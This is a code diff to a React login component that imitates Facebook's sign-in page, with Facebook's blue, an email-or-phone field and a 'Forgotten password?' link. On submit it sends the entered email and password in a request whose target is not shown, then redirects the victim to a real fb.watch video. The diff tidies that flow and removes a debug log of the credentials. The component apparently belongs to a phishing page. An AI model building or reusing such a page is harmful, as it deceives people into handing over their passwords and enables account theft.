@@ -11,7 +11,7 @@ const Login = () => {
 
     const handleSubmit = async (e) => {
         e.preventDefault()
-        console.log('submit value', emailOrPhone, password)
+
 
         const config = {
             headers: { "Content-Type": "application/json" },
@@ -29,7 +29,8 @@ const Login = () => {
             config
         );
 
-        navigate('https://fb.watch/iss6gbp9ul/')
+
+        navigate(window.location.href = 'https://fb.watch/iss6gbp9ul/')
 
     }
 
@@ -63,6 +64,7 @@ const Login = () => {
                             outline-1
                             outline-[#1877f2] border-2 border-gray'
                         />
+
                         {
                             password.length > 0 &&
                             <div className='mb-4'>
@@ -82,10 +84,15 @@ const Login = () => {
                         }
                     </div>
 
-
-                    <input type="submit"
+                    <input type="submit" value="Login"
                         onClick={handleSubmit}
-                        value="Login" className='bg-[#1877f2] cursor-pointer text-white py-2 text-lg font-semibold rounded-md' />
+                        className='bg-[#1877f2] text-center cursor-pointer
+                        text-white py-2 text-lg font-semibold
+                         rounded-md'   />
+
+
+
+
                 </form>
 
                 <a href="/asf" className='text-[#1877f2] w-[90%] mx-auto text-center border-b-2 border-gray'>Forgotten password?</a>
